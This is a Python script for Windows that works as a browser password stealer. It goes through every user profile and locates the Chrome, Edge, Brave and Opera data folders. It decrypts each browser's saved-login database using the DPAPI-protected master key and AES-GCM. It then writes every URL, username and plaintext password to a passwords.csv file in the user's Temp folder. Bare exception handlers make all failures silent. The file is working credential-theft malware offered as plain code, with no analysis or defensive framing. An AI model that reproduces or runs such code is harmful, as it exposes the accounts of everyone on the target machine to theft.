import os
import json
import base64
import shutil
import sqlite3
import csv
from Crypto.Cipher import AES
import win32crypt

BROWSERS = {
    "Chrome": r"AppData\Local\Google\Chrome\User Data",
    "Edge": r"AppData\Local\Microsoft\Edge\User Data",
    "Brave": r"AppData\Local\BraveSoftware\Brave-Browser\User Data",
    "Opera": r"AppData\Roaming\Opera Software\Opera Stable"
}

def find_users_directory():
    for user_folder in os.listdir('C:\\Users'):
        if user_folder.lower() in ['default', 'public', 'all users']:
            continue
        user_path = os.path.join('C:\\Users', user_folder)
        if os.path.isdir(user_path):
            yield user_path

def get_encryption_key(local_state_path):
    try:
        with open(local_state_path, 'r', encoding='utf-8') as file:
            local_state_data = json.load(file)
            encrypted_key = local_state_data['os_crypt']['encrypted_key']
            key_data = base64.b64decode(encrypted_key)[5:]
            decrypted_key = win32crypt.CryptUnprotectData(key_data, None, None, None, 0)[1]
            return decrypted_key
    except:
        return None

def decrypt_password(ciphertext, key):
    try:
        if not ciphertext or ciphertext[:3] != b'v10':
            return ""
        iv = ciphertext[3:15]
        payload = ciphertext[15:-16]
        tag = ciphertext[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(payload, tag)
        return decrypted.decode()
    except:
        return ""

def get_browser_passwords(db_path, key, results):
    temp_db_path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), 'temp_login_data.db')
    try:
        shutil.copyfile(db_path, temp_db_path)
    except:
        return

    try:
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        for url, username, password_bytes in rows:
            if isinstance(password_bytes, str):
                password_bytes = password_bytes.encode()
            password = decrypt_password(password_bytes, key)
            results.append([url, username, password])
    except:
        pass
    finally:
        conn.close()
        if os.path.exists(temp_db_path):
            os.remove(temp_db_path)

def try_browser_profiles(user_path, base_path, results):
    local_state_path = os.path.join(user_path, base_path, "Local State")
    if not os.path.exists(local_state_path):
        return

    key = get_encryption_key(local_state_path)
    if not key:
        return

    profile_base = os.path.join(user_path, base_path)
    for profile in os.listdir(profile_base):
        profile_path = os.path.join(profile_base, profile)
        if os.path.isdir(profile_path):
            db_path = os.path.join(profile_path, "Login Data")
            if os.path.exists(db_path):
                get_browser_passwords(db_path, key, results)

if __name__ == "__main__":
    for user_dir in find_users_directory():
        all_results = []
        for browser, rel_path in BROWSERS.items():
            try_browser_profiles(user_dir, rel_path, all_results)

        if all_results:
            user_temp = os.path.join(user_dir, "AppData", "Local", "Temp")
            os.makedirs(user_temp, exist_ok=True)
            output_path = os.path.join(user_temp, "passwords.csv")
            with open(output_path, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(["URL", "Username", "Password"])
                writer.writerows(all_results)
